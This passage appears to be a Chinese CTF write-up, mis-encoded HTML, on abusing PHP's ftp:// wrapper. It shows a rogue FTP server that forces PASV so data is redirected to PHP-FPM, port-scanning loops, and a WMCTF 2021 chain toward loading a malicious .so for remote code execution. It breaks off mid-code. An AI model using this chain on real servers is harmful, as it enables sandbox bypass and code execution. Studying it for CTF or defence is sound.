&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftpå†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œä¸€ç›´æ˜¯å¯ä»¥æ–°å»ºæ–‡ä»¶ä½†æ˜¯å†™å…¥ä¸äº†ï¼Œè¯»å…¥çš„å‚æ•°2ä¸€ç›´æ˜¯int(0)ï¼Œæš‚æ—¶è¿˜æ²¡è§£å†³é—®é¢˜ï¼ˆä¸è¿‡ç”¨ä¸‹é¢é‚£ä¸ªå†™å…¥å¾ˆæ­£å¸¸â€¦â€¦&lt;/p>
&lt;p>è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftpå¹¶è½¬å‘ftp-data">ä»¤phpä½¿ç”¨ftp://å¹¶è½¬å‘FTP-DATA&lt;/h4>
&lt;p>å°†ä¸Šé¢çš„æ“ä½œç”¨wiresharkæŠ“ä¸ªåŒ…çœ‹çœ‹æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯EPSV modeè€Œä¸æ˜¯PASV modeï¼Œä¸ä¼šæœ‰æ‹¬å·å†…çš„ip+portæè¿°ï¼ŒFTP-DATAåªä¼šè¢«æ‰“å‘æŽ§åˆ¶è¿žæŽ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œä¸èƒ½åšåˆ°FTP-DATAçš„ä»»æ„è½¬å‘&lt;/p>
&lt;p>ä¸è¿‡ä¹Ÿä¸æ˜¯æ¯«æ— åŠžæ³•ï¼Œå¦‚æžœç”¨EPSVå‘½ä»¤è¿”å›žçš„ç»“æžœä¸æ˜¯229ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤&lt;/p>
&lt;p>å°†ä¸Šé¢çš„ftp-serverä¿®æ”¹ä¸€ä¸‹ï¼Œå°†229å“åº”è®¾ä¸ºäº†000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>æˆåŠŸè½¬å‘&lt;/p>
&lt;h4 id="ä½¿ç”¨ftpå°†payloadæ‰“å‘fpm">ä½¿ç”¨ftp://å°†payloadæ‰“å‘fpm&lt;/h4>
&lt;p>ç»“åˆä¸Šé¢å‡ ä¸ªå®žä¾‹åº”è¯¥å°±å¾ˆæ¸…æ™°äº†ï¼Œæ€è·¯å°±æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>ç¼–å†™åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„.so&lt;/li>
&lt;li>æ‰“å‘fpmçš„ä¸€æ³¢æµé‡ï¼Œç”¨äºŽè§£å¼€open_basedir, allow_url_includeç­‰çš„é™åˆ¶ï¼Œå½¢å¼æ˜¯file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>ç”¨file_put_contents('/tmp/wuhu.so',$_POST[&amp;lsquo;data&amp;rsquo;])çš„å½¢å¼å°†.soä¼ å…¥&lt;/li>
&lt;li>å¦‚æžœé¡ºåˆ©çš„è¯open_basedirè§£å¼€é™åˆ¶ï¼Œ.soè¢«åŒ…å«ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ.soä¸­çš„ä»£ç åšåˆ°rceäº†&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œçš„å®Œç¾Žæ —å­å½“ç„¶æ˜¯èµµæ€»çš„ä¸‰å¥è¯ï¼ˆæŒ‡è·¯èµµæ€»åšå®¢-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>æ€è·¯å…ˆæ”¾åœ¨å‰é¢ï¼šæ‰¾åˆ°fpmç«¯å£-&amp;gt;æ­å»ºæ¶æ„ftp_server å°†.soæ–‡ä»¶è½¬å‘è‡³fpmç«¯å£-&amp;gt;åˆ©ç”¨.soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤-&amp;gt;æ‹¿flag&lt;/p>
&lt;p>é¢˜ç›®ä»£ç åªæœ‰ä¸‰å¥è¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æŽ¥çœ‹phpinfo();ä¼š500ï¼Œç”¨&lt;code>get_cfg_var&lt;/code>èŽ·å–é…ç½®é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;quot;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;quot;
&lt;/code>&lt;/pre>&lt;p>åªèƒ½è¯´è¯¥ç¦çš„éƒ½ç¦äº†ï¼›å†åº·åº·allow_url_fopenå’Œinclude&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;quot;1&amp;quot;
string(0) &amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å†åº·åº·open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;quot;/var/www/html/&amp;quot;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm è¿™ä¸ªä¹‹åŽä¹Ÿéœ€è¦ç»•è¿‡&lt;/p>
&lt;p>ç”¨tcp://ä¼ªåè®®æ‰«ä¸€ä¸‹æœ¬æœºå¼€æ”¾çš„ç«¯å£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;code>file_get_contents&lt;/code>å’Œ&lt;code>error_get_last&lt;/code>èŽ·å–åˆ°è¯·æ±‚ä¸­å‘å‡ºçš„é”™è¯¯è¿›è¡Œå¾ªçŽ¯åˆ¤æ–­ä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>æ‰¾åˆ°äº†fpmç«¯å£11451&lt;/p>
&lt;p>ä¹‹åŽå°±ç»­ä¸Šäº†æˆ‘ä»¬å‰é¢çš„æ€è·¯ï¼Œå…ˆåœ¨æœ¬åœ°ï¼ˆä¹Ÿå°±æ˜¯é¶æœºçš„æœ¬åœ°ï¼‰èµ·ä¸€ä¸ªæ¶æ„çš„ftp_serveræœåŠ¡ç”¨æ¥è½¬å‘FTP-DATAï¼ˆå³.soæ–‡ä»¶ï¼‰è‡³fpmç«¯å£ï¼ˆ11451ï¼‰ï¼›è¿™é‡Œçš„expæ˜¯phpç‰ˆçš„ï¼ŒåŽŸç†è·Ÿä¸Šé¢çš„pyç‰ˆæ˜¯ä¸€æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
